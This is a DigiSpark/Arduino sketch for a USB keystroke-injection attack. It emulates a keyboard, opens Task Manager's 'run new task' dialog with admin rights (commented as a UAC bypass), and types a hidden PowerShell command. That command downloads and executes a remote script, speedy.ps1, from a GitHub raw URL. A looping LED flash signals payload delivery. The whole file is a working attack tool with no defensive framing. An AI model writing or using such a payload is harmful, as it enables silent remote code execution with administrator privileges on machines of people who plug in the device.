#include "DigiKeyboard.h"

void setup() {

 // setup LED 
//
  pinMode(1, OUTPUT);

// flush keyboard
//
  Keyboard.update();
  Keyboard.sendKeyStroke(0);
  Keyboard.delay(100);

// start UAC Bypass
//
  Keyboard.sendKeyStroke(KEY_ESC, MOD_CTRL_RIGHT | MOD_SHIFT_RIGHT);
  Keyboard.delay(200);
  Keyboard.sendKeyStroke(KEY_F, MOD_ALT_RIGHT);
  Keyboard.delay(200);
  Keyboard.sendKeyStroke(KEY_N);
  Keyboard.delay(300);

// enter commands to be run as administrator
//
  Keyboard.write("powershell -windowstyle hidden -command \"IEX (iwr -uri \"http://raw.githubusercontent.com/ElijahCuff/Rubber-DigiKey/main/speedy.ps1\" -UseBasicParsing -DisableKeepAlive);\""); 
  Keyboard.delay(200);
// end UAC bypass
//
  Keyboard.sendKeyStroke(KEY_TAB);
  Keyboard.delay(100);  
  Keyboard.sendKeyStroke(KEY_SPACE);
  Keyboard.delay(200);
  Keyboard.sendKeyStroke(KEY_ENTER);
}


void loop() {
  // Start Light Flash Loop On Payload Delivery
  digitalWrite(1, HIGH);
  Keyboard.delay(100);
  digitalWrite(1, LOW);
  Keyboard.delay(200);
}
